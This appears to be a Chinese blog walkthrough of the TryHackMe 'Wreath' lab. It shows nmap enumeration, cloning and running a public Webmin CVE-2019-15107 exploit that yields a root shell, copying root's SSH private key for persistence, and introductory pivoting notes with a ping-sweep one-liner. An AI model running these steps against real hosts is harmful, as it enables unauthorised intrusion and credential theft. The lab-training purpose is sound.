@@ -1,0 +1,1201 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THMWreath | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="IntroductionWreath 旨在作为初学者的学习资源，主要侧重于：  Pivoting 使用 Empire C2（命令和控制）框架 简单的反病毒规避技术  还将涵盖以下主题，但更简短：  代码分析（Python 和 PHP） 定位和修改公共漏洞 简单的 Web 应用程序枚举和利用 Git 存储库分析 简单的 Windows 后利用技术 CLI 防火墙管理（CentOS 和 Windows">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THMWreath">
+<meta property="og:url" content="http://mikannse.space/2024/08/23/THMWreath/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="IntroductionWreath 旨在作为初学者的学习资源，主要侧重于：  Pivoting 使用 Empire C2（命令和控制）框架 简单的反病毒规避技术  还将涵盖以下主题，但更简短：  代码分析（Python 和 PHP） 定位和修改公共漏洞 简单的 Web 应用程序枚举和利用 Git 存储库分析 简单的 Windows 后利用技术 CLI 防火墙管理（CentOS 和 Windows">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2024-08-23T04:00:46.000Z">
+<meta property="article:modified_time" content="2024-08-23T04:12:21.331Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/08/23/THMWreath/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THMWreath',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2024-08-23 12:12:21'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THMWreath</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-23T04:00:46.000Z" title="发表于 2024-08-23 12:00:46">2024-08-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-23T04:12:21.331Z" title="更新于 2024-08-23 12:12:21">2024-08-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">33.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>113分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THMWreath"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Wreath 旨在作为初学者的学习资源，主要侧重于：</p>
+<ul>
+<li>Pivoting</li>
+<li>使用 Empire C2（命令和控制）框架</li>
+<li>简单的反病毒规避技术</li>
+</ul>
+<p>还将涵盖以下主题，但更简短：</p>
+<ul>
+<li>代码分析（Python 和 PHP）</li>
+<li>定位和修改公共漏洞</li>
+<li>简单的 Web 应用程序枚举和利用</li>
+<li>Git 存储库分析</li>
+<li>简单的 Windows 后利用技术</li>
+<li>CLI 防火墙管理（CentOS 和 Windows）</li>
+<li>交叉编译技术</li>
+<li>编码包装程序</li>
+<li>简单的渗透技术</li>
+<li>格式化渗透测试报告</li>
+</ul>
+<p>这些将在利用 Wreath 网络的过程中教授。</p>
+<p>这几乎被设计为一个沙盒环境，以跟随教学内容；重点将放在上述教学要点上，而不是初始访问和权限提升漏洞上（与平台上其他专注于挑战的盒子相反）</p>
+<h1 id="Brief"><a href="#Brief" class="headerlink" title="Brief"></a>Brief</h1><p>Thomas 发送了以下有关网络的信息：</p>
+<hr>
+<p>*我家网络上有两台机器，用于托管我业余时间进行的项目和工作内容——其中一台机器有一个端口转发的网络服务器，所以如果你能找到漏洞，它就是你的入口！它为一个网站提供服务，该网站从我自己的 PC 推送到我的 git 服务器进行版本控制，然后克隆到面向公众的服务器。看看你能不能进入这些！我自己的 PC 也在该网络上，但我怀疑你能进入，因为它已打开保护措施，没有运行任何易受攻击的东西，并且无法通过网络的面向公众的部分访问。好吧，我说的是 PC——从技术上讲，它是一台重新利用的服务器，因为我有一个闲置的许可证，但区别是一样的。<br>*</p>
+<hr>
+<p>由此我们可以得出以下信息：</p>
+<ul>
+<li>网络上有三台机器</li>
+<li>至少有一个面向公众的网络服务器</li>
+<li>网络上某处有一个自托管的 git 服务器</li>
+<li>git 服务器是内部的，因此 Thomas 可能已将敏感信息推送到其中</li>
+<li>网络上有一台安装了防病毒软件的 PC，这意味着我们可以猜测这很可能是 Windows</li>
+<li>听起来这很可能是 Windows 的服务器变体，这可能对我们有利</li>
+<li>无法从网络服务器直接访问（假设的）Windows PC</li>
+</ul>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><p><strong>与任何攻击一样，我们首先从枚举阶段开始，完成 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/furthernmap">Nmap</a> 房间（如果您还没有）将有助于完成此部分。</strong></p>
+<p><strong>Thomas 为我们提供了一个可供使用的 IP（显示在页面顶部的网络面板上），让我们首先对该 IP 的前 15000 个端口执行端口扫描。</strong></p>
+<p><strong>注意：</strong> 在这里（一般情况下），最好将扫描结果保存到文件中，这样您就不必重新运行相同的扫描两次。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap --min-rate=10000 -p- 10.200.219.200</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-19 09:27 UTC</span><br><span class="line">Nmap scan report for ip-10-200-219-200.eu-west-1.compute.internal (10.200.219.200)</span><br><span class="line">Host is up (0.0031s latency).</span><br><span class="line">Not shown: 65511 filtered tcp ports (no-response), 19 filtered tcp ports (admin-prohibited)</span><br><span class="line">PORT      STATE  SERVICE</span><br><span class="line">22/tcp    open   ssh</span><br><span class="line">80/tcp    open   http</span><br><span class="line">443/tcp   open   https</span><br><span class="line">9090/tcp  closed zeus-admin</span><br><span class="line">10000/tcp open   snet-sensor-mgmt</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.58 seconds</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -sV -sC -O -p22,80,443,10000 10.200.219.200</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-19 09:29 UTC</span><br><span class="line">Nmap scan report for ip-10-200-219-200.eu-west-1.compute.internal (10.200.219.200)</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">22/tcp    open  ssh      OpenSSH 8.0 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 9c1bd4b4054d8899ce091fc1156ad47e (RSA)</span><br><span class="line">|   256 9355b4d98b70ae8e950dc2b6d20389a4 (ECDSA)</span><br><span class="line">|_  256 f0615a55349bb7b83a46ca7d9fdcfa12 (ED25519)</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)</span><br><span class="line">|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c</span><br><span class="line">|_http-title: Did not follow redirect to https://thomaswreath.thm</span><br><span class="line">443/tcp   open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB</span><br><span class="line">| Not valid before: 2024-08-19T08:39:03</span><br><span class="line">|_Not valid after:  2025-08-19T08:39:03</span><br><span class="line">|_http-title: Thomas Wreath | Developer</span><br><span class="line">10000/tcp open  http     MiniServ 1.890 (Webmin httpd)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 5.4 (86%), Linux 2.6.32 (86%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 48.22 seconds</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当访问web页面时，自动跳转到了thomaswreath.thm但是无法访问，于是添加hosts,80和443端口是个人的门户网站，没有比较好的利用点。10000端口开着一个webmin服务，根据nmap的结果搜索MiniServ 1.890 (Webmin httpd)</p>
+<p>MiniServ 是一个轻量级的 HTTP/HTTPS 服务器，通常与 Webmin 和 Usermin 等管理工具一起使用。这些工具提供了基于 Web 的界面，允许管理员通过浏览器远程管理 Linux/Unix 系统</p>
+<p>并且发现存在漏洞:CVE-2019-15107</p>
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>在上一个任务中，我们发现了一个存在漏洞的service[<a target="_blank" rel="noopener" href="https://sensorstechforum.com/cve-2019-15107-webmin/">1]</a>[<a target="_blank" rel="noopener" href="https://www.webmin.com/exploit.html">2]</a>在目标上运行，这将使我们能够在目标上执行命令。</p>
+<p>下一步通常是找到此漏洞的利用方法，网上通常有针对已知漏洞的利用方法（我们将在接下来的任务中搜索这些漏洞！），但是，在这种情况下，<a target="_blank" rel="noopener" href="https://github.com/MuirlandOracle/CVE-2019-15107">此处</a>.</p>
+<hr>
+<p>首先克隆存储库，这可以使用以下命令来完成：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">git clone https://github.com/MuirlandOracle/CVE-2019-15107</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这会在我们的攻击计算机上创建该漏洞的本地副本，然后导航到该文件夹，然后安装所需的 Python 库：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cd CVE-2019-15107 &amp;&amp; pip3 install -r requirements.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果这不起作用，您可能需要在下载库之前安装 pip，可以通过以下方式完成：<br><code>sudo apt install python3-pip</code></p>
+<p>该脚本应该已经可执行，但如果不是，请添加可执行位（<code>chmod +x ./CVE-2019-15107.py</code>）。</p>
+<p>切勿运行来自互联网的未知脚本！通读代码，看看您是否能了解它在做什么（如果您不熟悉 Python，请不要担心 - 在本例中，漏洞已被编码。由该内容的作者编写，并且正在实验室环境中运行，因此您可以推断它不是恶意的，但是，在运行脚本之前阅读脚本是一个很好的做法。</p>
+<p>一旦您对脚本将按照其规定执行的操作感到满意，就可以针对目标运行漏洞利用程序！</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">./CVE-2019-15107.py TARGET_IP</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/a876ed2dd7ce.png" alt="Demonstration of the exploit"></p>
+<p>根据上文，一把梭拿到了shell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/桌面/tools/CVE-2019-15107]</span><br><span class="line">└─$ ./CVE-2019-15107.py 10.200.219.200</span><br><span class="line"></span><br><span class="line">        __        __   _               _         ____   ____ _____                                                            </span><br><span class="line">        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|                                                           </span><br><span class="line">         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|                                                             </span><br><span class="line">          \ V  V /  __/ |_) | | | | | | | | | | |  _ &lt;| |___| |___                                                            </span><br><span class="line">           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|                                                            </span><br><span class="line">                                                                                                                              </span><br><span class="line">                                                @MuirlandOracle                                                               </span><br><span class="line">                                                                                                                              </span><br><span class="line">                                                                                                                              </span><br><span class="line">[*] Server is running in SSL mode. Switching to HTTPS</span><br><span class="line">[+] Connected to https://10.200.219.200:10000/ successfully.</span><br><span class="line">[+] Server version (1.890) should be vulnerable!</span><br><span class="line">[+] Benign Payload executed!</span><br><span class="line"></span><br><span class="line">[+] The target is vulnerable and a pseudoshell has been obtained.</span><br><span class="line">Type commands to have them executed on the target.                                                                            </span><br><span class="line">[*] Type 'exit' to exit.</span><br><span class="line">[*] Type 'shell' to obtain a full reverse shell (UNIX only).</span><br><span class="line"></span><br><span class="line"># whoami</span><br><span class="line">root</span><br><span class="line">#</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以直接进行反弹shell,将/root/.ssh/id_rsa复制到本地作为持久性</p>
+<h1 id="What-is-Pivoting"><a href="#What-is-Pivoting" class="headerlink" title="What is Pivoting?"></a>What is Pivoting?</h1><p>枢转是利用在一台机器上获得的访问权限来更深入地利用网络中另一台机器的艺术，它是网络渗透测试最重要的方面之一，也是本会议室的三个主要教学点之一。</p>
+<p>简而言之，通过使用以下任务（或其他任务！）中描述的技术之一，攻击者有可能获得对远程网络的初始访问权限，并使用它来访问网络中的其他计算机，否则这些计算机将无法访问可访问：</p>
+<p><img src="https://assets.tryhackme.com/additional/wreath-network/6904b85a9b93.png" alt="Diagram showing an attacker machine outwith a target network with one public facing webserver and three terminals in an internal network."></p>
+<p>在该图中，目标网络上有四台机器：一台面向公共的服务器，三台机器不暴露在互联网上，然后我们可以通过访问公共服务器来攻击其余的三个目标。</p>
+<p><strong>注意：</strong> 这是一个示例图，并不代表 Wreath 网络。</p>
+<p>本节将包含许多关于从 Linux 和 Windows 受感染目标进行转移的理论，然后我们将针对网络中的下一台计算机将其付诸实践，但请记住：您可以使用受感染计算机的沙箱环境。枚举任务完成后，您还将了解网络中的下一台机器，在完成任务时可以随意使用这些工具，但请注意，某些技术可能会受到影响。被所涉及的防火墙阻止（我们稍后将在网络中考虑缓解措施）。</p>
+<h1 id="High-level-Overview"><a href="#High-level-Overview" class="headerlink" title="High-level Overview"></a>High-level Overview</h1><p>我们用于旋转的方法往往会因不同的目标操作系统而异，像 Metasploit 这样的框架可以使该过程变得更容易，但是，目前我们将研究更多的手动旋转技术。</p>
+<p>涉及这一领域的渗透测试主要有两种方法：</p>
+<ul>
+<li><strong>隧道/代理：</strong> 通过受感染的计算机创建代理类型连接，以便将所有所需流量路由到目标网络中，这也可能在另一个协议（例如 SSH 隧道）内进行“隧道化”。对于逃避基本的<strong>入侵</strong>D<strong>检测</strong>S**系统（IDS）或防火墙很有用</li>
+<li><strong>端口转发：</strong> 通过受感染的主机在本地端口和目标上的单个端口之间创建连接</li>
+</ul>
+<p>如果我们想要将大量不同类型的流量重定向到目标网络，例如使用 nmap 扫描，或者访问多台不同机器上的多个端口，那么代理是很好的选择。</p>
+<p>端口转发往往更快、更可靠，但只允许我们访问目标设备上的单个端口（或小范围）。</p>
+<p>哪种旋转方式更合适完全取决于网络的布局，因此在决定如何继续之前，我们必须从进一步的枚举开始，此时开始制定网络的布局也是明智的。如您所见的网络 - 尽管在本练习网络的情况下，布局是在屏幕顶部的框中给出的。</p>
+<p>作为一般规则，如果您有多个可能的入口点，请尽可能使用 Linux/Unix 目标，因为这些目标往往更容易转向，面向外部的 Linux Web 服务器绝对是理想的选择。</p>
+<p>本节中的其余任务将涵盖以下主题：</p>
+<ul>
+<li>使用本机和静态编译工具枚举网络</li>
+<li>Proxychains/FoxyProxy</li>
+<li>SSH 端口转发和隧道（主要是 Unix）<br>-plink.exe（Windows）<br>-socat（Windows 和 Unix）</li>
+<li>凿子（Windows 和 Unix）<br>-sshuttle（目前仅限 Unix）</li>
+</ul>
+<p>这远不是可用于旋转的工具的详尽列表，因此鼓励进一步研究。</p>
+<h1 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h1><p>一如既往，枚举是成功的关键——我们对目标了解得越多，可用的选择就越多，因此，我们在尝试通过网络进行转向时的第一步就是获得一个想法。我们周围的事物。</p>
+<p>有五种可能的方法可以通过受感染的主机枚举网络：</p>
+<ol>
+<li>使用在计算机上找到的材料，例如主机文件或 ARP 缓存。</li>
+<li>使用预装工具<br>3.使用静态编译工具<br>4.使用脚本技术<br>5.通过代理使用本地工具</li>
+</ol>
+<p>这些是按照优先顺序编写的。通过代理使用本地工具非常慢，因此理想情况下我们希望利用系统上预安装的工具（Linux 系统有时安装了 Nmap）。例如，默认情况下）。这是 Living off the Land (LotL) 的一个例子——这是一种最小化风险的好方法，如果失败的话，可以很容易地传输静态二进制文件，或者在其中组合一个简单的 ping-sweep 工具。 Bash（我们将在下面介绍）。</p>
+<p>不过，在做其他事情之前，明智的做法是检查目标上是否存储了任何有用的信息，可以在 Windows 或 Linux 中使用“arp -a”来检查计算机的 ARP 缓存——这将向您展示。同样，静态映射可以在 Linux 上的“/etc/hosts”或 Windows 上的“C:\Windows\System32\drivers\etc\hosts”中找到。 Linux 上的 /etc/resolv.conf 还可能识别任何本地 DNS 服务器，这些服务器可能被错误配置以允许诸如 DNS 区域传输攻击之类的攻击（这超出了本内容的范围，但值得在 Windows 上简单研究一下）。使用“ipconfig /all”检查 DNS 服务器的接口，Linux 有一个等效命令作为读取 resolv.conf 文件的替代命令：“nmcli dev show”。</p>
+<p>如果系统上尚未安装有用的工具，并且基本脚本无法运行，则可以获取许多工具的“静态”副本。这些工具的版本已以不正确的方式编译。换句话说，假设有正确的操作系统和架构，它们理论上可以在<em>任何</em>目标上工作，例如：可以找到针对不同操作系统（以及各种其他工具）的 Nmap 静态编译副本。在互联网上的各个地方都可以找到这些内容的良好（如果过时）资源<a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries">此处</a>。撰写本文时）可以在找到适用于 Linux 的 Nmap 版本<a target="_blank" rel="noopener" href="https://github.com/ernw/static-toolbox/releases/download/1.04/nmap-7.80SVN-x86_64-a36a34aa6-portable.zip">此处</a>请注意，许多静态工具存储库都非常过时。这些存储库中的工具可能仍然可以完成工作，但是您可能会发现它们需要不同的语法，或者无法按照您所使用的方式工作。预计。</p>
+<p><strong>注意：</strong> “静态”二进制文件和“动态”二进制文件之间的区别在于编译。大多数程序使用各种外部库（<code>.so</code> <em>Linux 上的文件，或</em><code>.dll）。 </code> <em>Windows 上的文件）——这些被称为“动态”程序，这些静态程序是使用内置到完成的可执行文件中的库进行编译的，当我们尝试在目标系统上使用二进制文件时，我们几乎总是需要。程序的静态编译副本，因为系统可能没有安装依赖项，这意味着动态二进制文件将无法运行。</em></p>
+<p>最后，通过代理进行可怕的扫描这绝对是最后的手段，因为通过代理链之类的扫描“非常”慢，而且通常受到限制（例如，您无法通过 TCP 代理扫描 UDP 端口，这是一个例外）。这条规则是在使用 Nmap 脚本引擎（NSE）时，由于脚本库没有附带该工具的静态编译版本，因此，您可以使用 Nmap 的静态副本来扫描网络并查找开放的主机。端口，然后通过代理使用 Nmap 的本地副本<em>专门针对找到的端口</em>。</p>
+<hr>
+<p>在将这一切付诸实践之前，我们先讨论一下基于陆地外壳的技术，理想情况下，目标上已经安装了 Nmap 这样的工具，但情况并非总是如此（事实上，您会发现 Nmap 不是）；  安装在 Wreath 网络当前受感染的服务器上），如果发生这种情况，则值得考虑是否可以使用已安装的 shell 来执行网络扫描，例如，以下 Bash 单行命令将执行完整的网络扫描。 ping 扫描 192.168.1.x 网络：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &amp;); done</span><br></pre></td></tr></tbody></table></figure>
+
